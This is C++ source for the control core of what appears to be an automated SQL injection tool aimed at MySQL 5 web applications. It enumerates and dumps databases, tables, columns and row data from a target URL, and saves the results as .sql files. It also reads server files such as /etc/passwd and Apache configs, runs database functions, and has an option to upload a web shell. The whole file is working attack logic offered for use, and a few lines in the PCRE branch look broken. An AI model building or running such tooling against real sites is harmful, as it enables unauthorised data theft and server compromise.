#include "Framework.h"

Framework::Framework()
{
    this->error_ = 0;				        // Error string
    this->host_ = 0;					    // Target host
    this->ip_ = 0;					        // Target IP of host
    this->path_ = 0;					    // Path
    this->rest_ = 0;					    // Rest after path
    this->method_ = (Methods)0;		        // Method chosen
    this->method_params = 0;		        // Method parameters
    this->always_lookup_ = true;
    this->max_rows_ = 0;

    this->attack_type_ = (AttackTypes)0;	// Attack type chosen
    this->requests = 0;				        // Amount of requests generated for one attack
    this->total_requests = 0;               // Total amount of requests generated

    this->_ip = 0;					        // char* version of this->ip
#ifdef USE_PCRE_REGEX
    this->re = 0;
#endif

    this->http = &Http::GetInstance();
    this->cache = 0;
    this->mysql = 0;
}

Framework::~Framework()
{
    if (this->host_)
        delete[] this->host_;

    if (this->ip_)
        delete[] this->ip_;

    if (this->_ip)
        delete[] this->_ip;

    if (this->mysql)
        delete this->mysql;
}

bool Framework::SetHost(TCHAR *host, unsigned short port)
{
    if (this->cache)
        this->cache->Reset();

    delete[] this->host_;
    delete[] this->ip_;
    delete[] this->_ip;
    this->host_ = this->ip_ = 0;
    this->_ip = 0;

    unsigned long len = _tcslen(host) + 1;
    this->host_ = new TCHAR[len];
    memset(this->host_, 0, len * sizeof(TCHAR));
    _tcscpy_s(this->host_, len, host);

    hostent *remoteHost;
    this->ip_ = new TCHAR[len];
    memset(this->ip_, 0, len * sizeof(TCHAR));
    _tcscpy_s(this->ip_, len, this->host_);

    char *_host = new char[len];
    memset(_host, 0, len * sizeof(char));

#if defined(_UNICODE) || defined(UNICODE)
    size_t count = 0;
    wcstombs_s(&count, _host, len, this->host_, _tcslen(this->host_));
#else
    strcpy(_host, this->host_);
#endif

    if (isalpha(int(_host[0])))
    {
        // remoteHost is deleted by winSock itself - http://msdn.microsoft.com/en-us/library/ms738524(VS.85).aspx
        remoteHost = http->ResolveHost(_host);
        if (remoteHost != NULL)
        {
            char *addr = inet_ntoa(*(in_addr*)*remoteHost->h_addr_list);
            len = strlen(addr) + 1;
            this->_ip = new char[len];
            memset(this->_ip, 0, len * sizeof(char));
            strcpy_s(this->_ip, len, addr);

            delete[] this->ip_;
            this->ip_ = new TCHAR[len];
            memset(this->ip_, 0, len * sizeof(TCHAR));
#if defined(_UNICODE) || defined(UNICODE)
            size_t cwritten = 0;
            mbstowcs_s(&cwritten, this->ip_, len, this->_ip, len * sizeof(TCHAR));
#else
            strcpy(this->ip_, this->_ip);
#endif
            LOG(0, _T("[*] %s is %s"), this->host_, this->ip_);
            LOG(0, "[*] Hostname is %s", remoteHost->h_name);
        }
        else
            LOG(0, _T("[-] Failed to get hostname (errorcode: %d)"), http->error_code());
    }
    else
    {
        unsigned int addr = inet_addr(_host);
        remoteHost = gethostbyaddr((char*)&addr, 4, AF_INET);
        if (remoteHost == NULL)
            LOG(0, _T("[-] Could not retrieve hostname"));
        else
            LOG(0, "[+] Hostname is %s", remoteHost->h_name);
    }
    delete[] _host;

    this->port_ = port;
    return true;
}

bool Framework::SetPath(TCHAR *path, TCHAR *rest)
{
    if (!this->host_)
    {
        this->set_error(_T("set host first"));
        return false;
    }

    delete[] this->path_;
    this->path_ = 0;

    unsigned long len = _tcslen(path) + 1;
    this->path_ = new TCHAR[len];
    memset(this->path_, 0, len * sizeof(TCHAR));
    _tcscpy_s(this->path_, len, path);

    if (this->rest_)
    {
        delete[] this->rest_;
        this->rest_ = 0;
    }

    if (rest)
    {
        len = _tcslen(rest) + 1;
        this->rest_ = new TCHAR[len];
        memset(this->rest_, 0, len * sizeof(TCHAR));
        _tcscpy_s(this->rest_, len, rest);
    }

    if (this->mysql)
        this->mysql->SetPath(this->path_, this->rest_);

    return true;
}

void Framework::SetInterval(unsigned long interval)
{
    if (!interval)
        http->interval = 200;
    else
        http->interval = interval;
}

void Framework::SetDynamicTags(TCHAR *start_tag, TCHAR *end_tag)
{
    unsigned long s1 = _tcslen(start_tag) + 1, s2 = _tcslen(end_tag) + 1;
    if (http->dynamic_start)
        delete[] http->dynamic_start;

    http->dynamic_start = new TCHAR[s1];
    memset(http->dynamic_start, 0, s1 * sizeof(TCHAR));
    _tcscpy_s(http->dynamic_start, s1, start_tag);
    if (http->dynamic_end)
        delete[] http->dynamic_end;

    http->dynamic_end = new TCHAR[s2];
    memset(http->dynamic_end, 0, s2 * sizeof(TCHAR));
    _tcscpy_s(http->dynamic_end, s2, end_tag);
}

void Framework::SetAttackType(AttackTypes type)
{
    this->attack_type_ = type;
}

void Framework::SetSpace(TCHAR *space)
{
    // Need to call 'method' command first
    this->mysql->set_space(space);
}

void Framework::SetTableQuoteChar(TCHAR *table_quote_char)
{
    // Need to call 'method' command first
    this->mysql->set_table_quote_char(table_quote_char);
}

void Framework::SetCookie(TCHAR *cookie)
{
    if (http->cookie)
        delete[] http->cookie;

    unsigned long len = _tcslen(cookie) + 1;
    http->cookie = new TCHAR[len];
    memset(http->cookie, 0, len);
    _tcscpy_s(http->cookie, len, cookie);
}

void Framework::SetLookup(bool always_lookup)
{
    this->always_lookup_ = always_lookup;
}

void Framework::SetMaxRows(int max_rows)
{
    this->max_rows_ = max_rows;
}

bool Framework::SetMethod(Methods method, TCHAR **argv, int argc)
{
    if (!this->path_)
    {
        this->set_error(_T("set path first"));
        return false;
    }

    if (this->mysql)
        delete this->mysql;

    this->mysql = new Mysql(method, this->host_, this->port_, this->path_, this->rest_);

    TCHAR _char = this->path_[_tcslen(this->path_) - 1];
    switch (method)
    {
        case kMethodBruteforce:
        {
            if (_char == _T('='))
            {
                this->set_error(_T("path can't end with '=' need id"));
                return false;
            }
            this->method_params = argv;

            if (this->mysql->regexp)
                delete[] this->mysql->regexp;

            size_t len = _tcslen(this->method_params[0]) + 1;
#ifdef USE_PCRE_REGEX
            this->mysql->regexp = new char[len];
            memset(this->mysql->regexp, 0, len * sizef(char));
            wcstombs(this->mysql->regexp, this->mparams[0], len);
            const char *error = 0;
            int erroffset = 0;
            LOG(0, "[*] RegExp string: %s", this->mysql->regexp);
            if (this->mysql->re)
                pcre_free(this->mysql->re);

            this->mysql->re = pcre_compile(this->mysql->regexp, 0, &error, &erroffset, 0);
            if (!this->re)
            {
                this->set_error(_T("failed to compile regexp string - invalid regular expression?"));
                return false;
            }
#else
            this->mysql->regexp = new TCHAR[len];
            memset(this->mysql->regexp, 0, len * sizeof(TCHAR));
            _tcscpy_s(this->mysql->regexp, len, this->method_params[0]);
#endif
            this->method_ = method;
        }
        break;

        case kMethodCachingNumberic:
        case kMethodCachingStrings:
        {
            if (this->path_[_tcslen(this->path_) - 1] == _T('\''))
            {
                this->set_error(_T("path may not end with a quote char (')."));
                return false;
            }

            if (this->method_ != method)
            {
                delete this->cache;
                this->cache = new Cache(method == kMethodCachingNumberic ? CachingType::kNumberic : CachingType::kString);
                mysql->set_cache(this->cache);
            }

            unsigned int cstart = 0;
            unsigned int cmax = 0;
            this->method_params = argv;
            this->method_ = method;
            if (this->method_ == kMethodCachingNumberic)
            {
                cstart = _ttoi(this->method_params[0]);
                cmax = (argc > 1 ? _ttoi(this->method_params[1]) : cstart + this->mysql->charlen);
            }
            else
            {
                cstart = 1;
                cmax = argc - 1;
            }
            bool result = this->cache->UpdateCacheList(this->host_, this->port_, this->path_, this->rest_, cstart, cmax, this->method_params, argc);
            this->requests = this->cache->requests();
            this->total_requests += this->requests;
            return result;
        }
        break;

        case kMethodUnionSelect:
        {
            if (!_tcsstr(this->path_, this->mysql->union_param_key))
            {
                this->set_error(_T("Union path must contain the keyword to replace"));
                return false;
            }
            this->method_ = method;
        }
        break;

        default:
        {
            this->method_params = 0;
            this->set_error(_T("invalid method supplied"));
            return false;
        }
        break;
    }
    return true;
}

bool Framework::ValidateConfig()
{
    if (!this->host_)
    {
        this->set_error(_T("set host first"));
        return false;
    }

    if (!this->port_)
    {
        this->set_error(_T("set port first"));
        return false;
    }

    if (!this->path_)
    {
        this->set_error(_T("set path first"));
        return false;
    }

    if (!this->method_)
    {
        this->set_error(_T("set method first"));
        return false;
    }

    if (!this->attack_type_)
    {
        this->set_error(_T("set attack type first"));
        return false;
    }
    return true;
}

bool Framework::Start(TCHAR **params, int argc)
{
    this->attack_params.clear();
    if (params)
    {
        for (int i = 0; i < argc; i++)
            this->attack_params.insert(this->attack_params.end(), params[i]);
    }

    if (!this->ValidateConfig())
        return false;

    unsigned long startcount = GetTickCount();
    SYSTEMTIME starttime;
    GetSystemTime(&starttime);

    this->requests = 0;
    this->set_error(_T(""));
    LOG(0, _T("[*] Attack started: \t%d/%02d/%02d @ %02d:%02d"), starttime.wYear, starttime.wMonth, starttime.wDay, starttime.wHour, starttime.wMinute);
    LOG(0, _T("[*] Target Host: \t%s:%d"), this->host_, this->port_);
    LOG(0, _T("[*] Target Path: \t%s%s"), this->path_, (this->rest_ ? this->rest_ : _T("")));
    LOG(0, _T("[*] Attack Type: \t%d"), this->attack_type_);
    LOG(0, _T("[*] Attack Method: \t%d"), this->method_);
    LOG(0, _T("[*] Space Character: \t%s"), (this->mysql->space() ? this->mysql->space() : _T("")));
    LOG(0, _T("[*] Interval: \t\t%d"), http->interval);
    LOG(0, _T("[*] Debug Level: \t%d"), this->GetDebug());

    unsigned long start_requests = mysql->requests();
    unsigned long version = this->GetDatabaseVersion();
    if (version != 5)
    {
        LOG(0, _T("[-] Found invalid version: %d, can't get database info"), version);
        this->set_error(_T("invalid remote MySQL version (need MySQL 5)"));
        return false;
    }
    LOG(0, _T("[*] Found MySQL version: %d"), version);

    switch (this->attack_type_)
    {
        case kCountDatabases:
        WriteDatabase(0, NULL, 0, NULL, 0, NULL, 0);
        break;

        case kGetDatabaseName:
        {
            unsigned long db = (argc ? _ttoi(this->attack_params[0]) : 0);
            WriteDatabase(db, NULL, 0, NULL, 0, NULL, 0);
        }
        break;

        case kCountTablesInDatabase:
        {
            TCHAR *db = (argc ? this->attack_params[0] : NULL);
            WriteDatabase(0, db, 0, NULL, 0, NULL, 0);
        }
        break;

        case kGetTableNameInDatabase:
        {
            TCHAR *db = (argc ? this->attack_params[0] : NULL);
            unsigned long table = (argc > 1 ? _ttoi(this->attack_params[1]) : 0);
            WriteDatabase(0, db, table, NULL, 0, NULL, 0);
        }
        break;

        case kCountColumnsInTable:
        {
            TCHAR *db = (argc ? this->attack_params[0] : NULL);
            TCHAR *table = (argc > 1 ? this->attack_params[1] : NULL);
            WriteDatabase(0, db, 0, table, 0, NULL, 0);
        }
        break;

        case kGetColumnNameInTable:
        {
            TCHAR *db = (argc ? this->attack_params[0] : NULL);
            TCHAR *table = (argc > 1 ? this->attack_params[1] : NULL);
            unsigned long column = (argc > 2 ? _ttoi(this->attack_params[2]) : 0);
            WriteDatabase(0, db, 0, table, column, NULL, 0);
        }
        break;

        case kCountRowsInTable:
        {
            TCHAR *db = (argc ? this->attack_params[0] : NULL);
            TCHAR *table = (argc > 1 ? this->attack_params[1] : NULL);
            WriteDatabase(0, db, 0, table, 0, NULL, 0);
        }
        break;

        case kGetRowDataInColumn:
        {
            TCHAR *db = (argc ? this->attack_params[0] : NULL);
            TCHAR *table = (argc > 1 ? this->attack_params[1] : NULL);
            TCHAR *column = (argc > 2 ? this->attack_params[2] : NULL);
           unsigned long row = (argc > 3 ? _ttoi(this->attack_params[3]) : 0);
           WriteDatabase(0, db, 0, table, 0, column, row);
        }
        break;

        case kGetRowDataInTable:
        {
            TCHAR *db = (argc ? this->attack_params[0] : NULL);
            TCHAR *table = (argc > 1 ? this->attack_params[1] : NULL);
            unsigned long row = (argc > 2 ? _ttoi(this->attack_params[2]) : 0);
            WriteDatabase(0, db, 0, table, 0, NULL, row);
        }
        break;

        case kDatabaseDoAll:
        WriteDatabase(0, NULL, 0, NULL, 0, NULL, 0);
        break;

        case kRunCustomCriteria:
        {
            TCHAR *db = (argc ? this->attack_params[0] : NULL);
            TCHAR *table = (argc > 1 ? this->attack_params[1] : NULL);
            TCHAR *column = (argc > 2 ? this->attack_params[2] : NULL);
            TCHAR *target = (argc > 3 ? this->attack_params[3] : NULL);
            if (!target)
            {
                this->set_error(_T("set target column for criteria first"));
                return false;
            }
            TCHAR *crit = this->attack_params[4];
            if (!crit)
            {
                this->set_error(_T("set criteria for target column first"));
                return false;
            }
            TCHAR *d = this->GetCustomData(db, table, column, target, crit);
            if (d)
                LOG(0, _T("[*] Found data: %s"), d);
            else
                LOG(0, _T("[-] Custom data not found"));
        }
        break;

        case kShowFileContents:
        {
            TCHAR *filepath = (argc ? this->attack_params[0] : NULL);
            std::list<TCHAR*> files;
            if (filepath)
            {
                files.insert(files.end(), filepath);
            }
            else
            {
                files.insert(files.end(), _T("/etc/passwd"));
                files.insert(files.end(), _T("/etc/apache/apache.conf"));
                files.insert(files.end(), _T("/etc/apache/httpd.conf"));
                files.insert(files.end(), _T("/etc/apache2/apache2.conf"));
                files.insert(files.end(), _T("/etc/apache2/httpd.conf"));
                files.insert(files.end(), _T("/etc/apache2/sites-available/default"));
                files.insert(files.end(), _T("/etc/apache2/ports.conf"));
                files.insert(files.end(), _T("/etc/apache2/sites-enabled/000-default"));
                files.insert(files.end(), _T("/etc/apache2/vhosts.d/default_vhost.include"));
                files.insert(files.end(), _T("/etc/init.d/apache"));
                files.insert(files.end(), _T("/etc/init.d/apache2"));
                files.insert(files.end(), _T("/etc/init.d/apache/httpd.conf"));
                files.insert(files.end(), _T("/etc/init.d/apache2/httpd.conf"));
                files.insert(files.end(), _T("/etc/httpd/httpd.conf"));
                files.insert(files.end(), _T("/etc/httpd/conf/httpd.conf"));
                files.insert(files.end(), _T("/opt/apache/conf/httpd.conf"));
                files.insert(files.end(), _T("/home/apache/httpd.conf"));
                files.insert(files.end(), _T("/home/apache/conf/httpd.conf"));
                files.insert(files.end(), _T("/usr/local/apache2/conf/httpd.conf"));
                files.insert(files.end(), _T("/usr/local/apache/conf/httpd.conf"));
                files.insert(files.end(), _T("/usr/local/etc/apache2/httpd.conf"));
                files.insert(files.end(), _T("/usr/local/etc/apache22/httpd.conf"));
                files.insert(files.end(), _T("/usr/pkg/etc/httpd/httpd.conf"));
                files.insert(files.end(), _T("/var/www/conf/httpd.conf"));
            }

            for (auto fpath : files)
            {
                TCHAR *file = this->LoadFile(fpath);
                LOG(0, _T("[*] File '%s' contents:\r\n%s"), fpath, file);
            }
        }
        break;

        case kShowConfigVariable:
        {
            TCHAR *variable = (argc ? this->attack_params[0] : NULL);
            if (!variable)
            {
                this->set_error(_T("set variable name"));
                return false;
            }
            TCHAR *value = this->GetConfigValue(variable);
            LOG(0, _T("[*] Found value for %s: %s"), variable, value);
        }
        break;

        case kExecuteFunction:
        {
            TCHAR *function = (argc ? this->attack_params[0] : NULL);
            if (!function)
            {
                this->set_error(_T("function name not set"));
                return false;
            }
            TCHAR *result = this->ExecuteFunction(function);
            LOG(0, _T("[*] Result for function %s: %s"), function, result);
            delete[] result;
        }
        break;
        
        case kUploadShell:
        {
            TCHAR *shellpath = (argc ? this->attack_params[0] : NULL);
            if (!shellpath)
            {
                this->set_error(_T("shellpath not set"));
                return false;
            }
            this->UploadShell(shellpath);
        }
    }
    this->requests = mysql->requests() - start_requests;
    this->total_requests += this->requests;
    SYSTEMTIME endtime;
    GetSystemTime(&endtime);
    LOG(0, _T("[*] Attack finished: \t%d/%02d/%02d @ %02d:%02d"), endtime.wYear, endtime.wMonth, endtime.wDay, endtime.wHour, endtime.wMinute);
    LOG(0, _T("[*] Generated %d request(s) for this attack over %d second(s)"), this->requests, (GetTickCount() -startcount) / 1000);
    LOG(0, _T("[*] Generated %d total requests for this session"), this->total_requests);
    WriteSql();
    return true;
}

void Framework::ShowHistoryList()
{
    MysqlWriter *writer = new MysqlWriter;
    unsigned long hostcount = this->history.hostcount();
    for (unsigned int a = 0; a < hostcount; a++)
    {
        HistoryHost *host = this->history.GetHost(a + 1);
        if (!host)
            break;

        if (host->databasecount >= 0)
            LOG(0, _T("[+] Host %d: %s (MySQL version: %d) (databases: %d)"), host->id, host->name, host->version, host->databasecount);
        else
            LOG(0, _T("[+] Host %d: %s (MySQL version: %d)"), host->id, host->name, host->version);

        for (auto db : host->databases)
        {
            if (db->tablecount >= 0)
                LOG(0, _T("[+] Database %d: %s (tables: %d)"), db->id, db->name, db->tablecount);
            else
                LOG(0, _T("[+] Database %d: %s"), db->id, db->name);

            int c = 0;
            for (auto table : db->tables)
            {
                int size = table->columns.size();

                if (size && c++)
                    LOG(0, "\r\n");
                
                if (table->columncount >= 0 && table->rowcount >= 0)
                    LOG(0, _T("[+] Table %d: %s (columns: %d rows: %d)"), table->id, table->name, table->columncount, table->rowcount);
                else if (table->columncount >= 0)
                    LOG(0, _T("[+] Table %d: %s (columns: %d)"), table->id, table->name, table->columncount);
                else if (table->rowcount >= 0)
                    LOG(0, _T("[+] Table %d: %s (rows: %d)"), table->id, table->name, table->rowcount);
                else
                    LOG(0, _T("[+] Table %d: %s"), table->id, table->name);


                if (size)
                    writer->WriteCons(table);
            }
        }

        for (auto file : host->files)
            LOG(0, _T("[+] File: %s\r\n%s"), file->filepath, file->contents);

        for (auto pair : host->variables)
            LOG(0, _T("[+] Variable=value: %s=%s"), pair->variable, pair->value);
    }
    delete writer;
}

void Framework::ShowCacheList()
{
    if (!this->cache)
        return;

    unsigned long cached_pages = 0;
    const PCacheList *pages = this->cache->GetCacheList(&cached_pages);
    if (!cached_pages)
    {
        LOG(0, _T("[-] No page(s) in cache"));
        return;
    }
    LOG(0, _T("page[index][id]index[num]needle[string]char[chr]"));

    for (unsigned int i = 0; i < cached_pages; i++)
    {
        PCacheList cpage = pages[i];
        unsigned long rpage = cpage->page;
        unsigned long needles = cpage->real_needles_count;
        for (unsigned long  x = 0; x < needles; x++)
            LOG(0, _T("cached[%d]page[%d]index[%d]needle[%s]"), i, rpage, x, cpage->real_needles[x]->needle);
    }
}

void Framework::WriteDatabase(int dbid, TCHAR *dbname, int tableid, TCHAR *tablename, int columnid, TCHAR *columnname, int rowid)
{
    AttackTypes type = this->attack_type_;

    int di = dbid ? dbid : 1;
    int dc = di;
    if (!dbid && !dbname)
    {
        dc = this->GetDatabaseCount();
        if (type == AttackTypes::kCountDatabases || type == AttackTypes::kDatabaseDoAll)
        {
            if (dc == RESULT_NOT_FOUND)
            {
                this->set_error(_T("no database(s) found"));
                return;
            }
            LOG(0, _T("[*] Found %d database(s)"), dc);
        }
    }

    if (type >= AttackTypes::kGetDatabaseName && dbid >= 0)
    {
        TCHAR *db = dbname;
        for (; di <= dc; di++)
        {
            if (!dbname)
            {
                db = this->GetDatabaseName(di);
                if (type == AttackTypes::kGetDatabaseName || type == AttackTypes::kDatabaseDoAll)
                {
                    if (!db)
                    {
                        LOG(0, _T("[-] No database name found for database %d"), di);
                        continue;
                    }
                    LOG(0, _T("[+] Found database name for database %d: %s"), di, db);
                }
            }

            if (this->mysql->IsKnownDatabase(db))
            {
                this->set_error(_T("known databases can not be enumerated - skipping database"));
                continue;
            }

            if (type >= AttackTypes::kCountTablesInDatabase && tableid >= 0)
                WriteTable(db, tableid, tablename, columnid, columnname, rowid);
        }
    }
}

void Framework::WriteTable(TCHAR *dbname, int tableid, TCHAR *tablename, int columnid, TCHAR *columnname, int rowid)
{
    AttackTypes type = this->attack_type_;

    int ti = tableid ? tableid : 1;
    int tc = ti;
    if (!tableid && !tablename)
    {
        tc = this->GetTableCount(dbname);
        if (type == AttackTypes::kCountTablesInDatabase || type == AttackTypes::kDatabaseDoAll)
        {
            if (tc == RESULT_NOT_FOUND)
            {
                LOG(0, _T("[-] Table count not found for database '%s'"), dbname);
                return;
            }
            LOG(0, _T("[+] Found %d table(s) in database '%s'"), tc, dbname);
        }
    }

    if (type >= AttackTypes::kGetTableNameInDatabase)
    {
        TCHAR *table = tablename;
        for (; ti <= tc; ti++)
        {
            if (!tablename)
            {
                table = this->GetTableName(dbname, ti);
                if (type == AttackTypes::kGetTableNameInDatabase || type == AttackTypes::kDatabaseDoAll)
                {
                    if (!table)
                    {
                        LOG(0, _T("[-] Table name not found for table %d in database '%s'"), ti, dbname);
                        continue;
                    }
                    LOG(0, _T("[+] Found table name for table %d in database '%s': %s"), ti, dbname, table);
                }
            }

            if (type >= AttackTypes::kCountRowsInTable && rowid >= 0)
            {
                int ri = rowid ? rowid : 1;
                int rc = ri;

                if (!rowid)
                {
                    rc = this->GetRowCount(dbname, table);
                    if (type == AttackTypes::kCountRowsInTable || type == AttackTypes::kDatabaseDoAll)
                    {
                        if (rc == RESULT_NOT_FOUND)
                        {
                            LOG(0, _T("[-] Row count not found for table '%s' in database '%s'"), table, dbname);
                            return;
                        }
                        LOG(0, _T("[+] Found %d row(s) in table '%s' in database '%s'"), rc, table, dbname);
                    }
                }
            }

            if (type >= AttackTypes::kCountColumnsInTable && type <= AttackTypes::kGetRowDataInColumn)
                WriteColumn(dbname, table, columnid, columnname, rowid);
            else if (type >= AttackTypes::kGetRowDataInTable)
                WriteRow(dbname, table, columnname, rowid);
        }
    }
}

void Framework::WriteColumn(TCHAR *dbname, TCHAR *tablename, int columnid, TCHAR *columnname, int rowid)
{
    AttackTypes type = this->attack_type_;

    int ci = columnid ? columnid : 1;
    int cc = ci;
    if (!columnid && !columnname)
    {
        cc = this->GetColumnCount(dbname, tablename);
        if (type == AttackTypes::kCountColumnsInTable || type == AttackTypes::kDatabaseDoAll)
        {
            if (cc == RESULT_NOT_FOUND)
            {
                LOG(0, _T("[-] Column count not found for table '%s' in database '%s'"), tablename, dbname);
                return;
            }
            LOG(0, _T("[+] Found %d column(s) in table '%s' in database '%s'"), cc, tablename, dbname);
        }
    }

    if (type >= AttackTypes::kGetColumnNameInTable)
    {
        TCHAR *column = columnname;
        for (; ci <= cc; ci++)
        {
            if (!columnname)
            {
                column = this->GetColumnName(dbname, tablename, ci);
                if (type == AttackTypes::kGetColumnNameInTable || type == AttackTypes::kDatabaseDoAll)
                {
                    if (!column)
                    {
                        LOG(0, _T("[-] Column name not found for column %d in table '%s' in database '%s'"), ci, tablename, dbname);
                        continue;
                    }
                    LOG(0, _T("[+] Found column name for column %d in table '%s' in database '%s': %s"), ci, tablename, dbname, column);
                }
            }
        }

        if (type >= AttackTypes::kGetRowDataInColumn)
            WriteRow(dbname, tablename, columnname, rowid);
    }
}

void Framework::WriteRow(TCHAR *dbname, TCHAR *tablename, TCHAR *columnname, int rowid)
{
    AttackTypes type = this->attack_type_;

    int ri = rowid ? rowid : 1;
    int rc = ri;

    if (!rowid)
        rc = this->mysql->GetRowCount(dbname, tablename);
    
    std::vector<TCHAR*> columnnames;
    std::vector<TCHAR*>::size_type s = this->attack_params.size(), i;
    if (s > 3)
    {
        // If there are columnnames supplied, use these
        for (i = 2; i < s; i++)
        {
            TCHAR* name = this->attack_params[i];
            if (std::all_of(name, name + _tcslen(name), [](TCHAR c) { return isdigit(c); }))
                ri = rc = _ttoi(name);
            else if (std::find(columnnames.begin(), columnnames.end(), name) == columnnames.end())
                columnnames.insert(columnnames.end(), name);
        }
    }
    else
    {
        // Otherwise, check if we have found the columnnames already
        HistoryTable *table = this->history.GetTable(this->host_, dbname, tablename);
        if (!table->columns.size())
        {
            // If not, retrieve them
            int ci = 1;
            int cc = this->GetColumnCount(dbname, tablename);
            for (; ci <= cc; ci++)
                this->GetColumnName(dbname, tablename, ci);
        }

        // Add them to the list of columnnames to retrieve row data from
        for (auto column : table->columns)
            columnnames.insert(columnnames.end(), column->name);
    }
   
    if (this->max_rows_ > 0)
        rc = min(this->max_rows_, rc);
    
    for (; ri <= rc; ri++)
    {
        if (this->method_ == Methods::kMethodUnionSelect)
        {
            std::map<TCHAR*, TCHAR*> row = this->GetRowData(dbname, tablename, columnnames, ri);
            if (!row.size())
            {
                LOG(0, _T("[-] Row data not found for row %d in table '%s' in database '%s'"), ri, tablename, dbname);
                continue;
            }

            for (auto pair : row)
                LOG(0, _T("[+] Found row data for row %d in %s.%s.%s: %s"), ri, dbname, tablename, pair.first, pair.second);
        }
        else
        {
            for (auto column : columnnames)
            {
                TCHAR *data = this->GetRowData(dbname, tablename, column, ri);
                if (!data)
                {
                    LOG(0, _T("[-] Row data not found for row %d for column '%s' in table '%s' in database '%s'"), ri, tablename, dbname);
                    continue;
                }
                LOG(0, _T("[+] Found row data for row %d in %s.%s.%s: %s"), ri, dbname, tablename, column, data);
            }
        }
    }
}

void Framework::WriteSql()
{
    MysqlWriter *writer = new MysqlWriter;
    for (long i = 1; i <= this->history.hostcount(); i++)
    {
        HistoryHost *host = this->history.GetHost(i);
        for (auto db : host->databases)
        {
            if (this->mysql->IsKnownDatabase(db->name))
                continue;

            SYSTEMTIME time;
            GetSystemTime(&time);
            TCHAR *filename = new TCHAR[100];
            _stprintf_s(filename, 100, _T("%s_%s_%d%02d%02d_%02d%02d.sql"), host->name, db->name, time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute);

            writer->WriteFile(filename, db);
        }
    }
    delete writer;
}

void Framework::set_error(TCHAR *error)
{
    this->error_ = error;
}

long Framework::GetDatabaseVersion() const
{
    HistoryHost *host = this->history.GetHost(this->host_);
    if (this->always_lookup_ && host && host->version && (host->version != RESULT_NOT_FOUND))
        return host->version;

    LOG(2, _T("[*] Bruteforcing database version"));

    long version = this->mysql->GetDatabaseVersion();

    if (!host)
        host = this->history.AddHost(this->host_);

    return (host->version = version);
}

long Framework::GetDatabaseCount() const
{
    HistoryHost *host = this->history.GetHost(this->host_);
    if (this->always_lookup_ && host && (host->databasecount != RESULT_NOT_FOUND))
        return host->databasecount;

    LOG(2, _T("[*] Bruteforcing amount of databases"));

    int dc = this->mysql->GetDatabaseCount();

    if (!host)
        host = this->history.AddHost(this->host_);

    return (host->databasecount = dc);
}

TCHAR *Framework::GetDatabaseName(long id) const
{
    HistoryDatabase *d = this->history.GetDatabase(this->host_, id);
    if (this->always_lookup_ && d)
        return d->name;

    LOG(2, _T("[*] Bruteforcing database name for database id %d"), id);

    TCHAR *dbname = this->mysql->GetDatabaseName(id);

    d = this->history.AddDatabase(this->host_, dbname, id);
    delete[] dbname;

    return d ? d->name : 0;
}

long Framework::GetDatabaseId(TCHAR *dbname) const
{
    HistoryDatabase *d = this->history.GetDatabase(this->host_, dbname);
    return d ? d->id : 1;
}

long Framework::GetTableCount(TCHAR *dbname) const
{
    HistoryDatabase *db = this->history.AddDatabase(this->host_, dbname, 0);
    if (this->always_lookup_ && db && (db->tablecount != RESULT_NOT_FOUND))
        return db->tablecount;

    LOG(2, _T("[*] Bruteforcing amount of tables in database '%s'"), dbname);

    long count = this->mysql->GetTableCount(dbname);

    return (db->tablecount = count);
}

TCHAR *Framework::GetTableName(TCHAR *dbname, long id) const
{
    HistoryTable *t = this->history.GetTable(this->host_, dbname, id);
    if (this->always_lookup_ && t)
        return t->name;

    LOG(2, _T("[*] Bruteforcing table name for table id %d in database %s"), id, dbname);

    TCHAR *tablename = this->mysql->GetTableName(dbname, id);

    t = this->history.AddTable(this->host_, dbname, tablename, id);
    delete[] tablename;

    return t ? t->name : 0;
}

long Framework::GetTableId(TCHAR *dbname, TCHAR *tablename) const
{
    HistoryTable *t = this->history.GetTable(this->host_, dbname, tablename);
    return t ? t->id : 1;
}

long Framework::GetColumnCount(TCHAR *dbname, TCHAR *tablename) const
{
    HistoryTable *db = this->history.AddTable(this->host_, dbname, tablename, 0);
    if (this->always_lookup_ && db && (db->columncount != RESULT_NOT_FOUND))
        return db->columncount;

    LOG(2, _T("[*] Bruteforcing amount of columns in table '%s' in database '%s'"), tablename, dbname);

    long count = this->mysql->GetColumnCount(dbname, tablename);

    return (db->columncount = count);
}

TCHAR *Framework::GetColumnName(TCHAR *dbname, TCHAR *tablename, long id) const
{
    HistoryColumn *c = this->history.GetColumn(this->host_, dbname, tablename, id);
    if (this->always_lookup_ && c)
        return c->name;

    LOG(2, _T("[*] Bruteforcing column name for column id %d in table %s in database %s"), id, tablename, dbname);

    TCHAR *columnname = this->mysql->GetColumnName(dbname, tablename, id);

    c = this->history.AddColumn(this->host_, dbname, tablename, columnname, id);
    delete[] columnname;

    return c ? c->name : 0;
}

long Framework::GetColumnId(TCHAR *dbname, TCHAR *tablename, TCHAR *columnname) const
{
    HistoryColumn *c = this->history.GetColumn(this->host_, dbname, tablename, columnname);
    return c ? c->id : 1;
}

long Framework::GetRowCount(TCHAR *dbname, TCHAR *tablename) const
{
    HistoryTable *table = this->history.AddTable(this->host_, dbname, tablename, 0);
    if (this->always_lookup_ && table && (table->rowcount != RESULT_NOT_FOUND))
        return table->rowcount;

    LOG(2, _T("[*] Bruteforcing amount of rows in table '%s' in database '%s'"), tablename, dbname);

    long count = this->mysql->GetRowCount(dbname, tablename);

    return (table->rowcount = count);
}

std::map<TCHAR*, TCHAR*> Framework::GetRowData(TCHAR *dbname, TCHAR *tablename, std::vector<TCHAR*>& columnnames, long row) const
{
    std::map<TCHAR*, TCHAR*> rowdata;
    std::vector<TCHAR*> missing_columns;
    HistoryRow *r;
    for (auto columnname : columnnames)
    {
        r = this->history.GetRow(this->host_, dbname, tablename, columnname, row);
        if (this->always_lookup_ && r)
        {
            rowdata.insert(rowdata.end(), std::pair<TCHAR*, TCHAR*>(columnname, r->data));
            continue;
        }
        missing_columns.insert(missing_columns.end(), columnname);
    }

    if (missing_columns.size())
    {
        LOG(2, _T("[*] Bruteforcing row data for row id %d in table %s in database %s"), row, tablename, dbname);

        std::map<TCHAR*, TCHAR*> data = this->mysql->GetRowData(dbname, tablename, missing_columns, row);

        for (auto entry : data)
        {
            r = this->history.AddRow(this->host_, dbname, tablename, entry.first, entry.second, row);

            // Only delete the second (value); the first (key) is the columnname we pass from missing_columns
            delete[] entry.second;
            rowdata.insert(rowdata.end(), std::pair<TCHAR*, TCHAR*>(r->column->name, r->data));
        }
    }

    return rowdata;
}

